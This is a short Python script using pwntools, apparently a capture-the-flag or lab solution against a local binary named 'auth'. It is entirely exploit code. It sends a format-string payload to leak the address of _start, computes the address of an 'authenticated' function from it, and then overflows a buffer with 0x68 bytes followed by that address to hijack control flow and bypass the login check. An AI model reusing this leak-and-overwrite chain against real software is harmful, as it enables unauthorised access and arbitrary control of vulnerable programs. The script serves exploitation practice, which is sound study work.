import pwn

BIN_PATH = "insert/path/to/auth"

io = pwn.process([BIN_PATH], level="error")
io.sendline("%9$p")
response = io.recvline()

start_addr = int(str(response).split("x")[1].split(",")[0], 16) # extract the address of _start from the response
authenticated_addr = start_addr + int("10c", 16)
io.sendline(b"a"*int("68", 16) + pwn.util.packing.p64(authenticated_addr))
print(str(io.recvline()))
